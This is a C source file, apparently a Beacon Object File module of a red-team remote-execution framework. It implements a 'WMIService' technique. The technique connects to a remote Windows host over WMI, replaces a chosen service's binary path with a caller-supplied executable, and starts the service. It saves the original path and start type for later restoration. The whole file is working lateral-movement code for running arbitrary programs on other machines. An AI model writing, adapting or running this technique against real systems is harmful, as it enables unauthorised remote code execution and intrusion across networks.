#include <windows.h>

#include "rex.h"
#include "service.h"
#include "technique.h"
#include "wmi.h"

REX_DECLARE_TECHNIQUE(rex_wmi_service);

const rex_technique rex_technique_descriptor = {
    "WMIService", "service_snapshot_and_wmi_session", "win32_service",
    REX_DISPOSITION_DISPATCHED,
    rex_wmi_service_decode, rex_wmi_service_preflight,
    rex_wmi_service_execute, rex_wmi_service_release,
};

DECLSPEC_IMPORT HANDLE WINAPI KERNEL32$GetProcessHeap(void);
DECLSPEC_IMPORT LPVOID WINAPI KERNEL32$HeapAlloc(HANDLE, DWORD, SIZE_T);
DECLSPEC_IMPORT BOOL WINAPI KERNEL32$HeapFree(HANDLE, DWORD, LPVOID);

typedef struct {
    rex_service_snapshot *snapshot;
    rex_wmi_session *wmi;
} rex_wmi_service_state;

static HRESULT rex_wmi_service_decode(const rex_arguments *arguments,
                               rex_request *request) {
    if (rex_wcslen(arguments->values[0]) == 0 ||
        rex_wcslen(arguments->values[1]) == 0 ||
        rex_wcslen(arguments->values[2]) != 0) {
        return E_INVALIDARG;
    }
    request->config.service.name = arguments->values[0];
    request->config.service.binary_path = arguments->values[1];
    return S_OK;
}

static HRESULT rex_wmi_service_preflight(const rex_request *request,
                                  rex_state *state) {
    HANDLE heap = KERNEL32$GetProcessHeap();
    rex_wmi_service_state *value = (rex_wmi_service_state *)KERNEL32$HeapAlloc(
        heap, HEAP_ZERO_MEMORY, sizeof(*value));
    HRESULT result;
    if (value == NULL) {
        return E_OUTOFMEMORY;
    }
    result = rex_service_snapshot_open(
        request->target, request->config.service.name, 0, &value->snapshot);
    if (SUCCEEDED(result)) {
        result = rex_wmi_open(request->target, &value->wmi);
    }
    if (FAILED(result)) {
        rex_wmi_close(value->wmi);
        rex_service_snapshot_close(value->snapshot);
        KERNEL32$HeapFree(heap, 0, value);
        return result;
    }
    state->private_data = value;
    return S_OK;
}

static HRESULT rex_wmi_service_execute(const rex_request *request,
                                rex_state *state,
                                rex_observation *observation) {
    rex_wmi_service_state *value = (rex_wmi_service_state *)state->private_data;
    HRESULT result;
    if (value == NULL) {
        return E_UNEXPECTED;
    }
    result = rex_wmi_service_change(value->wmi, request->config.service.name,
                                    request->config.service.binary_path);
    if (SUCCEEDED(result)) {
        observation->recovery.kind = REX_RECOVERY_RESTORE_SERVICE;
        observation->recovery.value.service.name = request->config.service.name;
        observation->recovery.value.service.original_binary_path =
            rex_service_original_binary_path(value->snapshot);
        observation->recovery.value.service.applied_binary_path =
            request->config.service.binary_path;
        observation->recovery.value.service.original_start_type =
            rex_service_original_start_type(value->snapshot);
        result = rex_wmi_service_start(value->wmi, request->config.service.name);
    }
    return result;
}

static void rex_wmi_service_release(rex_state *state) {
    HANDLE heap = KERNEL32$GetProcessHeap();
    rex_wmi_service_state *value = (rex_wmi_service_state *)state->private_data;
    if (value == NULL) {
        return;
    }
    rex_wmi_close(value->wmi);
    rex_service_snapshot_close(value->snapshot);
    KERNEL32$HeapFree(heap, 0, value);
    state->private_data = NULL;
}
